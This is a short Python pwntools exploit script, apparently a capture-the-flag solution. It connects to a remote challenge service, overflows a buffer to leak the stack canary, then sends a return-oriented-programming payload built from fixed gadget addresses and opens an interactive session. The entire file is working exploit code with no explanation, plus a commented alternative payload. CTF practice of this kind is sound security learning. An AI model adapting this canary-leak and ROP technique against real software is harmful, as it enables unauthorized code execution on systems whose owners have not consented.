from pwn import *

io = remote('114.67.246.176', 15948)
# io = process('./pwn')
io.send(cyclic(0x238) + b'\n')
io.recvuntil(b'fpaafqaaf\n')
canary = io.recv(7)
io.recv()
payload = cyclic(0x208) + b'\0' + canary + p64(0xdeadbeef) + p64(0x400963) + p64(0x601068) + p64(0x40080c)
io.send(payload)
io.recvuntil(b'Bye~')
io.interactive()
# payload = cyclic(0x208) + b'\0' + canary + p64(0xdeadbeef) +  p64(0x400963) + p64(0x601068) + p64(0) + p64(0x40080c)